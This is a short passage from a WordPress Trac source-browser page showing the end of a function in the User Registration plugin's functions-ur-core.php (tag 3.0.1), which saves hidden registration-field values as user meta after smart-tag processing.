| [3774](#L3774) | if ( isset( $value->extra\_params['field\_key'] ) && 'hidden' === $value->extra\_params['field\_key'] ) { |
| [3775](#L3775) | $content    = $value->value; |
| [3776](#L3776) | $field\_name = 'user\_registration\_' . $value->field\_name; |
| [3777](#L3777) | if ( '' !== $content ) { |
| [3778](#L3778) | $content = apply\_filters( 'user\_registration\_process\_smart\_tags', $content, $values ); |
| [3779](#L3779) | update\_user\_meta( $user\_id, $field\_name, $content ); |
| [3780](#L3780) | } |
| [3781](#L3781) | } |
| [3782](#L3782) | } |
| [3783](#L3783) | } |
| [3784](#L3784) | } |

**Note:** See [TracBrowser](/wiki/TracBrowser)
for help on using the repository browser.

[Trac UI Preferences](/prefs)
### Download in other formats:

* [Plain Text](/browser/user-registration/tags/3.0.1/includes/functions-ur-core.php?format=txt)
* [Original Format](/export/3220636/user-registration/tags/3.0.1/includes/functions-ur-core.php)

* [About](https://wordpress.org/about/)
* [News](https://wordpress.org/news/)
* [Hosting](https://wordpress.org/hosting/)
* [Donate](https://wordpressfoundation.org/donate/)
* [Swag](https://mercantile.wordpress.org/)

* [Documentation](https://wordpress.org/documentation/)
* [Developers](https://developer.wordpress.org/)
* [Get Involved](https://make.wordpress.org/)
* [Learn](https://learn.wordpress.org/)

* [Showcase](https://wordpress.org/showcase/)
* [Plugins](https://wordpress.org/plugins/)
* [Themes](https://wordpress.org/themes/)
* [Patterns](https://wordpress.org/patterns/)

* [WordCamp](https://central.wordcamp.org/)
* [WordPress.TV](https://wordpress.tv/)
* [BuddyPress](https://buddypress.org/)
* [bbPress](https://bbpress.org/)

* [WordPress.com](https://wordpress.com/?ref=wporg-footer)
* [Matt](https://ma.tt/)
* [Privacy](https://wordpress.org/about/privacy/)
* [Public Code](https://publiccode.eu/)

[WordPress.org](https://wordpress.org/)

[WordPress.org](https://wordpress.org/)

* [Visit our Facebook page](https://www.facebook.com/WordPress/)
* [Visit our Twitter account](https://twitter.com/WordPress)
* [Visit our Instagram account](https://www.instagram.com/wordpress/)
* [Visit our LinkedIn account](https://www.linkedin.com/company/wordpress)

![Code is Poetry](https://s.w.org/style/images/code-is-poetry-for-dark-bg.svg)


